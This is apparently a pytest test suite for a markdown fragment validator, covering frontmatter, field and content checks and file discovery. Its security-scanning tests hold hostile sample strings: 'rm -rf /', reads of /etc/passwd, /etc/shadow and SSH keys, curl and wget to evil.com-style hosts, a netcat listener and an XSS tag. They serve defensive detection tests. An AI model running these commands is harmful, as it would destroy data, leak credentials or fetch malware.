"""Unit tests for FragmentValidator."""

from unittest.mock import patch

import pytest

from pacc.validators.fragment_validator import FragmentValidator


class TestFragmentValidator:
    """Test FragmentValidator functionality."""

    @pytest.fixture
    def validator(self):
        """Create a FragmentValidator instance for testing."""
        return FragmentValidator()

    @pytest.fixture
    def valid_fragment_content(self):
        """Valid fragment content with frontmatter."""
        return """---
title: Test Fragment
description: A test fragment for unit testing
tags: [test, example, demo]
category: testing
author: Test Author
---

# Test Fragment

This is a test fragment with proper structure.

## Overview

This fragment demonstrates:
- Proper YAML frontmatter
- Well-structured markdown content
- Multiple sections

## Code Example

```python
def test_function():
    return "Hello, World!"
```

## Notes

- This is useful for testing
- Contains various elements
- Has proper organization
"""

    @pytest.fixture
    def fragment_no_frontmatter(self):
        """Valid fragment content without frontmatter."""
        return """# Simple Fragment

This is a simple fragment without YAML frontmatter.

## Content

- Just markdown content
- No metadata
- Still valid

Some more detailed content here to make it substantial.
"""

    def test_init_default(self, validator):
        """Test FragmentValidator initialization with defaults."""
        assert validator.max_file_size == 10 * 1024 * 1024  # 10MB
        assert validator.get_extension_type() == "fragments"

    def test_init_custom_size(self):
        """Test FragmentValidator initialization with custom max file size."""
        validator = FragmentValidator(max_file_size=1024)
        assert validator.max_file_size == 1024

    def test_get_extension_type(self, validator):
        """Test get_extension_type returns correct type."""
        assert validator.get_extension_type() == "fragments"

    def test_validate_valid_fragment_with_frontmatter(
        self, validator, valid_fragment_content, temp_dir
    ):
        """Test validation of valid fragment with frontmatter."""
        fragment_file = temp_dir / "test_fragment.md"
        fragment_file.write_text(valid_fragment_content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert result.extension_type == "fragments"
        assert str(fragment_file) in result.file_path
        assert len(result.errors) == 0

        # Check metadata extraction
        assert result.metadata["has_frontmatter"] is True
        assert result.metadata["title"] == "Test Fragment"
        assert result.metadata["description"] == "A test fragment for unit testing"
        assert result.metadata["tags"] == ["test", "example", "demo"]
        assert result.metadata["category"] == "testing"
        assert result.metadata["author"] == "Test Author"
        assert result.metadata["markdown_length"] > 0
        assert result.metadata["total_length"] > 0
        assert result.metadata["line_count"] > 0

    def test_validate_valid_fragment_no_frontmatter(
        self, validator, fragment_no_frontmatter, temp_dir
    ):
        """Test validation of valid fragment without frontmatter."""
        fragment_file = temp_dir / "simple_fragment.md"
        fragment_file.write_text(fragment_no_frontmatter)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert len(result.errors) == 0

        # Check metadata
        assert result.metadata["has_frontmatter"] is False
        assert result.metadata["title"] == ""
        assert result.metadata["description"] == ""
        assert result.metadata["tags"] == []
        assert result.metadata["markdown_length"] > 0

    def test_validate_empty_file(self, validator, temp_dir):
        """Test validation of empty file."""
        empty_file = temp_dir / "empty.md"
        empty_file.write_text("")

        result = validator.validate_single(empty_file)

        assert result.is_valid is False
        assert len(result.errors) == 1
        assert result.errors[0].code == "EMPTY_FILE"
        assert "empty" in result.errors[0].message.lower()

    def test_validate_whitespace_only_file(self, validator, temp_dir):
        """Test validation of file with only whitespace."""
        whitespace_file = temp_dir / "whitespace.md"
        whitespace_file.write_text("   \n   \t   \n   ")

        result = validator.validate_single(whitespace_file)

        assert result.is_valid is False
        assert any(error.code == "EMPTY_FILE" for error in result.errors)

    def test_validate_wrong_extension(self, validator, temp_dir):
        """Test validation of file with wrong extension."""
        txt_file = temp_dir / "fragment.txt"
        txt_file.write_text("# Fragment Content\n\nSome content here.")

        result = validator.validate_single(txt_file)

        assert result.is_valid is True  # Still valid, just warning
        assert len(result.warnings) >= 1
        assert any(w.code == "UNEXPECTED_FILE_EXTENSION" for w in result.warnings)

    def test_validate_file_not_found(self, validator, temp_dir):
        """Test validation of non-existent file."""
        nonexistent = temp_dir / "nonexistent.md"

        result = validator.validate_single(nonexistent)

        assert result.is_valid is False
        assert len(result.errors) == 1
        assert result.errors[0].code == "FILE_NOT_FOUND"

    def test_validate_encoding_error(self, validator, temp_dir):
        """Test validation with encoding error."""
        fragment_file = temp_dir / "fragment.md"

        # Write valid content first
        fragment_file.write_text("# Test")

        # Mock open to raise UnicodeDecodeError
        with patch("builtins.open", side_effect=UnicodeDecodeError("utf-8", b"", 0, 1, "invalid")):
            result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        assert len(result.errors) == 1
        assert result.errors[0].code == "ENCODING_ERROR"

    def test_validate_file_read_error(self, validator, temp_dir):
        """Test validation with file read error."""
        fragment_file = temp_dir / "fragment.md"
        fragment_file.write_text("# Test")

        # Mock open to raise general exception
        with patch("builtins.open", side_effect=Exception("Permission denied")):
            result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        assert len(result.errors) == 1
        assert result.errors[0].code == "FILE_READ_ERROR"


class TestFragmentFrontmatter:
    """Test frontmatter parsing and validation."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_invalid_yaml_frontmatter(self, validator, temp_dir):
        """Test fragment with invalid YAML frontmatter."""
        content = """---
title: Test Fragment
invalid: yaml: syntax: [unclosed
description: Test
---

# Content
"""
        fragment_file = temp_dir / "invalid_yaml.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        assert any(error.code == "INVALID_YAML" for error in result.errors)

    def test_malformed_frontmatter(self, validator, temp_dir):
        """Test fragment with malformed frontmatter (missing closing ---)."""
        content = """---
title: Test Fragment
description: Test

# Content without closing frontmatter
"""
        fragment_file = temp_dir / "malformed.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        # Should be treated as content without frontmatter
        assert result.is_valid is True
        assert result.metadata["has_frontmatter"] is False

    def test_empty_frontmatter(self, validator, temp_dir):
        """Test fragment with empty frontmatter."""
        content = """---
---

# Content
Some content here.
"""
        fragment_file = temp_dir / "empty_frontmatter.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert result.metadata["has_frontmatter"] is True
        # Empty frontmatter should be valid - it's optional

    def test_non_dict_frontmatter(self, validator, temp_dir):
        """Test fragment with non-dict frontmatter."""
        content = """---
- item1
- item2
- item3
---

# Content
"""
        fragment_file = temp_dir / "non_dict.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        assert any(error.code == "INVALID_FRONTMATTER_FORMAT" for error in result.errors)

    def test_field_type_validation(self, validator, temp_dir):
        """Test validation of field types in frontmatter."""
        content = """---
title: 123  # Should be string
description: true  # Should be string
tags: "tag1,tag2"  # Valid: string or list
category: ["invalid"]  # Should be string
---

# Content
"""
        fragment_file = temp_dir / "field_types.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        errors_by_code = {error.code: error for error in result.errors}
        assert "INVALID_FIELD_TYPE" in errors_by_code

        # Should have multiple type errors
        type_errors = [e for e in result.errors if e.code == "INVALID_FIELD_TYPE"]
        assert len(type_errors) >= 3  # title, description, category

    def test_unknown_frontmatter_fields(self, validator, temp_dir):
        """Test fragment with unknown frontmatter fields."""
        content = """---
title: Test Fragment
description: Test description
unknown_field: some value
another_unknown: another value
---

# Content
"""
        fragment_file = temp_dir / "unknown_fields.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True  # Unknown fields are just info warnings
        info_messages = [w for w in result.warnings if w.severity == "info"]
        assert len(info_messages) >= 2  # Should have info about unknown fields


class TestFragmentFieldValidation:
    """Test individual field validation."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_title_validation(self, validator, temp_dir):
        """Test title field validation."""
        test_cases = [
            ("", "EMPTY_TITLE", "warning"),  # Empty title
            ("A" * 201, "TITLE_TOO_LONG", "warning"),  # Too long
            ("Hi", "TITLE_TOO_SHORT", "info"),  # Too short
            ("Good Title", None, None),  # Valid title
        ]

        for title, expected_code, expected_severity in test_cases:
            content = f"""---
title: {title}
description: Test description
---

# Content
"""
            fragment_file = temp_dir / f"title_test_{hash(title)}.md"
            fragment_file.write_text(content)

            result = validator.validate_single(fragment_file)

            if expected_code:
                issues = result.errors + result.warnings
                assert any(issue.code == expected_code for issue in issues)
                if expected_severity:
                    matching_issue = next(issue for issue in issues if issue.code == expected_code)
                    assert matching_issue.severity == expected_severity
            else:
                # No title-related issues expected
                title_issues = [
                    issue for issue in result.all_issues if "title" in issue.message.lower()
                ]
                assert len(title_issues) == 0

    def test_description_validation(self, validator, temp_dir):
        """Test description field validation."""
        test_cases = [
            ("", "EMPTY_DESCRIPTION", "warning"),
            ("A" * 1001, "DESCRIPTION_TOO_LONG", "warning"),
            ("Good description", None, None),
        ]

        for description, expected_code, _expected_severity in test_cases:
            content = f"""---
title: Test Fragment
description: {description}
---

# Content
"""
            fragment_file = temp_dir / f"desc_test_{hash(description)}.md"
            fragment_file.write_text(content)

            result = validator.validate_single(fragment_file)

            if expected_code:
                issues = result.errors + result.warnings
                assert any(issue.code == expected_code for issue in issues)

    def test_tags_validation_list_format(self, validator, temp_dir):
        """Test tags validation with list format."""
        content = """---
title: Test Fragment
description: Test description
tags: [valid, tags, here]
---

# Content
"""
        fragment_file = temp_dir / "tags_list.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert result.metadata["tags"] == ["valid", "tags", "here"]

    def test_tags_validation_string_format(self, validator, temp_dir):
        """Test tags validation with comma-separated string format."""
        content = """---
title: Test Fragment
description: Test description
tags: "tag1, tag2, tag3"
---

# Content
"""
        fragment_file = temp_dir / "tags_string.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert result.metadata["tags"] == ["tag1", "tag2", "tag3"]

    def test_tags_validation_invalid_type(self, validator, temp_dir):
        """Test tags validation with invalid type."""
        content = """---
title: Test Fragment
description: Test description
tags: 123
---

# Content
"""
        fragment_file = temp_dir / "tags_invalid.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        assert any(error.code == "INVALID_TAGS_TYPE" for error in result.errors)

    def test_tags_validation_edge_cases(self, validator, temp_dir):
        """Test tags validation edge cases."""
        content = """---
title: Test Fragment
description: Test description
tags: ["", "tag with spaces", "very_long_tag_that_exceeds_fifty_characters_limit_test"]
---

# Content
"""
        fragment_file = temp_dir / "tags_edge_cases.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        # Should have warnings/info about issues
        issues = result.errors + result.warnings
        assert any("empty" in issue.message.lower() for issue in issues)
        assert any("spaces" in issue.message.lower() for issue in issues)
        assert any("long" in issue.message.lower() for issue in issues)

    def test_tags_too_many(self, validator, temp_dir):
        """Test validation with too many tags."""
        many_tags = [f"tag{i}" for i in range(25)]  # 25 tags, over the 20 limit
        content = f"""---
title: Test Fragment
description: Test description
tags: {many_tags}
---

# Content
"""
        fragment_file = temp_dir / "too_many_tags.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert any(w.code == "TOO_MANY_TAGS" for w in result.warnings)


class TestFragmentContentValidation:
    """Test markdown content validation."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_empty_markdown_content(self, validator, temp_dir):
        """Test fragment with empty markdown content."""
        content = """---
title: Test Fragment
description: Test description
---

"""
        fragment_file = temp_dir / "empty_content.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is False
        assert any(error.code == "EMPTY_MARKDOWN_CONTENT" for error in result.errors)

    def test_very_short_content(self, validator, temp_dir):
        """Test fragment with very short content."""
        content = """---
title: Test Fragment
description: Test description
---

Short."""
        fragment_file = temp_dir / "short_content.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True  # Valid but with warning
        assert any(w.code == "VERY_SHORT_CONTENT" for w in result.warnings)

    def test_content_organization_suggestions(self, validator, temp_dir):
        """Test suggestions for better content organization."""
        # Long content without headers
        long_content_no_headers = """---
title: Test Fragment
description: Test description
---

This is a long piece of content that goes on and on without any headers to organize it. It talks about various topics and contains a lot of information but doesn't use headers to structure the content properly. This makes it harder to read and navigate. The content continues with more details about different aspects of the topic, but still maintains the same paragraph structure throughout without any organizational elements like headers or lists to break up the text flow and make it more digestible for readers.
"""

        fragment_file = temp_dir / "no_headers.md"
        fragment_file.write_text(long_content_no_headers)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert any(w.code == "NO_HEADERS_FOUND" for w in result.warnings)

    def test_code_blocks_suggestion(self, validator, temp_dir):
        """Test suggestion for using code blocks."""
        content = """---
title: Code Fragment
description: Fragment with code references
---

This fragment talks about code and functions and scripts but doesn't use proper code blocks to format them.
"""
        fragment_file = temp_dir / "code_suggestion.md"
        fragment_file.write_text(content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        # Should suggest code blocks since content mentions code
        assert any(w.code == "CONSIDER_CODE_BLOCKS" for w in result.warnings)

    def test_lists_suggestion(self, validator, temp_dir):
        """Test suggestion for using lists."""
        long_content_no_lists = """---
title: Test Fragment
description: Test description
---

This fragment contains a lot of information that could be organized better. It has multiple points and various details that would benefit from being structured in lists. The content covers several topics and includes many different aspects that readers need to understand. Without proper list formatting, it becomes harder to scan and digest the information quickly.
"""

        fragment_file = temp_dir / "no_lists.md"
        fragment_file.write_text(long_content_no_lists)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert any(w.code == "CONSIDER_LISTS" for w in result.warnings)


class TestFragmentSecurity:
    """Test security scanning functionality."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_command_injection_detection(self, validator, temp_dir):
        """Test detection of command injection patterns."""
        malicious_content = """---
title: Malicious Fragment
description: Contains dangerous patterns
---

# Dangerous Commands

Execute this: $(cat /etc/passwd)
Also run: `rm -rf /important/data`
And pipe: ls | grep secret
Redirect: echo password > /tmp/creds
"""

        fragment_file = temp_dir / "malicious.md"
        fragment_file.write_text(malicious_content)

        result = validator.validate_single(fragment_file)

        # Should still be valid but with security warnings
        assert result.is_valid is True
        security_warnings = [w for w in result.warnings if w.code == "POTENTIAL_SECURITY_ISSUE"]
        assert len(security_warnings) > 0

    def test_script_injection_detection(self, validator, temp_dir):
        """Test detection of script injection patterns."""
        malicious_content = """---
title: Script Injection Fragment
---

# Dangerous Scripts

<script>alert('xss')</script>
javascript:void(0)
eval("dangerous code")
exec("malicious.py")
"""

        fragment_file = temp_dir / "script_injection.md"
        fragment_file.write_text(malicious_content)

        result = validator.validate_single(fragment_file)

        security_warnings = [w for w in result.warnings if w.code == "POTENTIAL_SECURITY_ISSUE"]
        assert len(security_warnings) > 0

    def test_file_system_manipulation_detection(self, validator, temp_dir):
        """Test detection of file system manipulation."""
        malicious_content = """---
title: File System Fragment
---

# Dangerous File Operations

sudo rm -rf /
Access /etc/passwd for passwords
Read /etc/shadow for more secrets
"""

        fragment_file = temp_dir / "file_system.md"
        fragment_file.write_text(malicious_content)

        result = validator.validate_single(fragment_file)

        security_warnings = [w for w in result.warnings if w.code == "POTENTIAL_SECURITY_ISSUE"]
        assert len(security_warnings) > 0

    def test_network_access_detection(self, validator, temp_dir):
        """Test detection of network access patterns."""
        malicious_content = """---
title: Network Fragment
---

# Network Commands

curl https://evil.com/malware
wget http://badsite.com/script.sh
nc -l -p 1337
"""

        fragment_file = temp_dir / "network.md"
        fragment_file.write_text(malicious_content)

        result = validator.validate_single(fragment_file)

        security_warnings = [w for w in result.warnings if w.code == "POTENTIAL_SECURITY_ISSUE"]
        assert len(security_warnings) > 0

    def test_environment_variable_detection(self, validator, temp_dir):
        """Test detection of environment variable access."""
        suspicious_content = """---
title: Environment Fragment
---

# Environment Access

Access ${HOME} directory
Check process.env.SECRET_KEY
Use os.environ['PASSWORD']
"""

        fragment_file = temp_dir / "environment.md"
        fragment_file.write_text(suspicious_content)

        result = validator.validate_single(fragment_file)

        security_warnings = [w for w in result.warnings if w.code == "POTENTIAL_SECURITY_ISSUE"]
        assert len(security_warnings) > 0

    def test_excessive_external_links(self, validator, temp_dir):
        """Test detection of excessive external links."""
        many_links_content = """---
title: Links Fragment
---

# Many Links

""" + "\n".join([f"Visit https://site{i}.com" for i in range(15)])

        fragment_file = temp_dir / "many_links.md"
        fragment_file.write_text(many_links_content)

        result = validator.validate_single(fragment_file)

        assert any(w.code == "MANY_EXTERNAL_LINKS" for w in result.warnings)

    def test_embedded_base64_detection(self, validator, temp_dir):
        """Test detection of embedded base64 content."""
        base64_content = """---
title: Base64 Fragment
---

# Embedded Data

![Image](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)
"""

        fragment_file = temp_dir / "base64.md"
        fragment_file.write_text(base64_content)

        result = validator.validate_single(fragment_file)

        assert any(w.code == "EMBEDDED_BASE64_CONTENT" for w in result.warnings)

    def test_sensitive_path_detection(self, validator, temp_dir):
        """Test detection of sensitive path references."""
        sensitive_content = """---
title: Paths Fragment
---

# Sensitive Paths

Access /etc/passwd
Check /root/.ssh/id_rsa
Look in C:\\Windows\\System32
Browse C:\\Users\\Administrator
Check /var/log/messages
"""

        fragment_file = temp_dir / "sensitive_paths.md"
        fragment_file.write_text(sensitive_content)

        result = validator.validate_single(fragment_file)

        path_warnings = [w for w in result.warnings if w.code == "SENSITIVE_PATH_REFERENCE"]
        assert len(path_warnings) > 0

    def test_safe_content_no_warnings(self, validator, temp_dir):
        """Test that safe content doesn't trigger security warnings."""
        safe_content = """---
title: Safe Fragment
description: This is a safe, helpful fragment
tags: [safe, documentation, help]
---

# Safe Documentation Fragment

This fragment contains only safe, helpful information.

## Getting Started

1. Read the documentation
2. Follow the examples
3. Ask questions if needed

## Code Example

```python
def hello_world():
    print("Hello, World!")
```

## Resources

- Official documentation
- Community forums
- Help guides

This content is completely safe and helpful.
"""

        fragment_file = temp_dir / "safe.md"
        fragment_file.write_text(safe_content)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True

        # Should have no security warnings
        security_warnings = [w for w in result.warnings if w.code.startswith("POTENTIAL_")]
        assert len(security_warnings) == 0


class TestFragmentFileDiscovery:
    """Test fragment file discovery functionality."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_find_fragment_files_by_name(self, validator, temp_dir):
        """Test finding fragment files by filename pattern."""
        # Create files
        (temp_dir / "my_fragment.md").write_text("# Fragment")
        (temp_dir / "code_fragment.md").write_text("# Code Fragment")
        (temp_dir / "not_fragment.md").write_text("# Regular Doc")
        (temp_dir / "readme.md").write_text("# Readme")

        files = validator._find_extension_files(temp_dir)
        file_names = [f.name for f in files]

        assert "my_fragment.md" in file_names
        assert "code_fragment.md" in file_names
        # Should not find files without "fragment" in name unless they have other indicators

    def test_find_fragment_files_by_directory(self, validator, temp_dir):
        """Test finding fragment files in fragments directory."""
        fragments_dir = temp_dir / "fragments"
        fragments_dir.mkdir()

        (fragments_dir / "note1.md").write_text("# Note")
        (fragments_dir / "note2.md").write_text("# Another Note")
        (temp_dir / "regular.md").write_text("# Regular")

        files = validator._find_extension_files(temp_dir)
        file_names = [f.name for f in files]

        assert "note1.md" in file_names
        assert "note2.md" in file_names

    def test_find_fragment_files_by_frontmatter(self, validator, temp_dir):
        """Test finding fragment files by YAML frontmatter."""
        frontmatter_file = temp_dir / "has_frontmatter.md"
        frontmatter_file.write_text("""---
title: Test
---

# Content
""")

        no_frontmatter_file = temp_dir / "no_frontmatter.md"
        no_frontmatter_file.write_text("# Just Content")

        files = validator._find_extension_files(temp_dir)
        file_names = [f.name for f in files]

        assert "has_frontmatter.md" in file_names
        # Files without frontmatter might still be found based on other criteria

    def test_find_fragment_files_by_content_keywords(self, validator, temp_dir):
        """Test finding fragment files by content keywords."""
        memory_file = temp_dir / "memory_note.md"
        memory_file.write_text("# Memory\n\nThis is a memory fragment.")

        reference_file = temp_dir / "reference_doc.md"
        reference_file.write_text("# Reference\n\nQuick reference guide.")

        regular_file = temp_dir / "tutorial.md"
        regular_file.write_text("# Tutorial\n\nStep by step guide.")

        files = validator._find_extension_files(temp_dir)
        file_names = [f.name for f in files]

        assert "memory_note.md" in file_names
        assert "reference_doc.md" in file_names
        # tutorial.md might or might not be included based on heuristics

    def test_find_fragment_files_handles_read_errors(self, validator, temp_dir):
        """Test that file discovery handles read errors gracefully."""
        # Create a file we can read
        good_file = temp_dir / "good.md"
        good_file.write_text("# Good Fragment")

        # Create a file and then make it unreadable by mocking
        bad_file = temp_dir / "bad.md"
        bad_file.write_text("# Bad Fragment")

        # Mock the file reading to fail for bad_file
        original_open = open

        def mock_open_func(file, *args, **kwargs):
            if str(file).endswith("bad.md"):
                raise PermissionError("Access denied")
            return original_open(file, *args, **kwargs)

        with patch("builtins.open", side_effect=mock_open_func):
            files = validator._find_extension_files(temp_dir)

        # Should still find files, even if some can't be read
        assert len(files) >= 1
        file_names = [f.name for f in files]
        assert "bad.md" in file_names  # Should still be included for full validation


class TestFragmentValidatorEdgeCases:
    """Test edge cases and error conditions."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_very_large_file(self, validator, temp_dir):
        """Test validation of file that exceeds size limit."""
        large_file = temp_dir / "large.md"

        # Create validator with small size limit
        small_validator = FragmentValidator(max_file_size=100)

        # Write content larger than limit
        large_file.write_text("# Large\n" + "x" * 200)

        result = small_validator.validate_single(large_file)

        assert result.is_valid is False
        assert any(error.code == "FILE_TOO_LARGE" for error in result.errors)

    def test_unicode_content(self, validator, temp_dir):
        """Test validation of fragment with Unicode content."""
        unicode_content = """---
title: Unicode Fragment 📝
description: Fragment with émojis and spéciał chāractęrs
tags: [unicode, émojis, special]
author: Tëst Authør
---

# Unicode Fragment 🌟

This fragment contains various Unicode characters:
- Émojis: 🚀 📝 ⭐ 🎯
- Accented characters: café, naïve, résumé
- Special symbols: ©️ ™️ ®
- Different scripts: 日本語 العربية Русский

## Code with Unicode

```python
def greet(name):
    return f"Hello, {name}! 👋"
```

This tests Unicode handling in fragments.
"""

        fragment_file = temp_dir / "unicode.md"
        fragment_file.write_text(unicode_content, encoding="utf-8")

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert result.metadata["title"] == "Unicode Fragment 📝"
        assert "émojis" in result.metadata["tags"]

    def test_mixed_line_endings(self, validator, temp_dir):
        """Test fragment with mixed line endings."""
        content_with_mixed_endings = """---\r\ntitle: Mixed Endings\r\ndescription: Fragment with mixed line endings\n---\r\n\r\n# Content\n\nThis has mixed line endings.\r\nSome lines use \\r\\n\nOthers use just \\n\r\n"""

        fragment_file = temp_dir / "mixed_endings.md"
        with open(fragment_file, "w", encoding="utf-8", newline="") as f:
            f.write(content_with_mixed_endings)

        result = validator.validate_single(fragment_file)

        assert result.is_valid is True
        assert result.metadata["title"] == "Mixed Endings"

    def test_deeply_nested_directory(self, validator, temp_dir):
        """Test finding fragments in deeply nested directories."""
        # Create deeply nested structure
        deep_dir = temp_dir / "level1" / "level2" / "level3" / "fragments"
        deep_dir.mkdir(parents=True)

        fragment_file = deep_dir / "deep_fragment.md"
        fragment_file.write_text("""---
title: Deep Fragment
---

# Deep Fragment

Found in nested directory.
""")

        files = validator._find_extension_files(temp_dir)

        assert len(files) >= 1
        assert any(f.name == "deep_fragment.md" for f in files)

    def test_binary_file_with_md_extension(self, validator, temp_dir):
        """Test handling of binary file with .md extension."""
        binary_file = temp_dir / "binary.md"
        # Write some binary data
        with open(binary_file, "wb") as f:
            f.write(b"\x00\x01\x02\x03\x04\x05\xff\xfe")

        result = validator.validate_single(binary_file)

        assert result.is_valid is False
        # Should get encoding error
        assert any(error.code == "ENCODING_ERROR" for error in result.errors)


class TestFragmentValidatorIntegration:
    """Integration tests for FragmentValidator."""

    @pytest.fixture
    def validator(self):
        return FragmentValidator()

    def test_complete_validation_workflow(self, validator, temp_dir):
        """Test complete validation workflow with multiple fragments."""
        # Create various types of fragments
        fragments = {
            "good_fragment.md": """---
title: Good Fragment
description: A well-structured fragment
tags: [good, example]
category: documentation
---

# Good Fragment

This is a well-structured fragment with:

## Features
- Proper frontmatter
- Good structure
- Safe content

## Code Example
```python
def example():
    return "safe"
```

This fragment should pass validation with no issues.
""",
            "warning_fragment.md": """---
title: Warning Fragment but Very Long Title That Exceeds Reasonable Length Limits
description: A fragment that will generate warnings
tags: ["", "tag with spaces", "very_long_tag_that_exceeds_fifty_characters_limit"]
---

Short content that might generate warnings.
""",
            "security_fragment.md": """---
title: Security Fragment
description: Contains security concerns
---

# Security Issues

This fragment contains some concerning patterns:
- Execute $(whoami)
- Run `cat /etc/passwd`
- Access https://site1.com and https://site2.com and many more links
""",
        }

        results = []
        for filename, content in fragments.items():
            fragment_file = temp_dir / filename
            fragment_file.write_text(content)
            result = validator.validate_single(fragment_file)
            results.append((filename, result))

        # Verify results
        good_result = next(r[1] for r in results if r[0] == "good_fragment.md")
        assert good_result.is_valid is True
        assert len(good_result.errors) == 0

        warning_result = next(r[1] for r in results if r[0] == "warning_fragment.md")
        assert warning_result.is_valid is True  # Valid but with warnings
        assert len(warning_result.warnings) > 0

        security_result = next(r[1] for r in results if r[0] == "security_fragment.md")
        assert security_result.is_valid is True  # Valid but with security warnings
        security_warnings = [
            w for w in security_result.warnings if w.code == "POTENTIAL_SECURITY_ISSUE"
        ]
        assert len(security_warnings) > 0

    def test_directory_validation_integration(self, validator, temp_dir):
        """Test directory-level validation integration."""
        # Create fragments directory with various files
        fragments_dir = temp_dir / "fragments"
        fragments_dir.mkdir()

        # Create mix of fragment and non-fragment files
        (fragments_dir / "fragment1.md").write_text("---\ntitle: Fragment 1\n---\n# Fragment 1")
        (fragments_dir / "fragment2.md").write_text(
            "# Fragment 2\n\nSimple fragment without frontmatter."
        )
        (fragments_dir / "readme.md").write_text("# README\n\nThis is a readme file.")
        (fragments_dir / "note.md").write_text("# Note\n\nThis is a memory note.")
        (temp_dir / "other.txt").write_text("Not a markdown file")

        # Find fragment files
        files = validator._find_extension_files(temp_dir)

        # Should find the fragment files
        assert len(files) >= 2  # At least the obvious fragments
        file_names = [f.name for f in files]
        assert "fragment1.md" in file_names
        assert "fragment2.md" in file_names
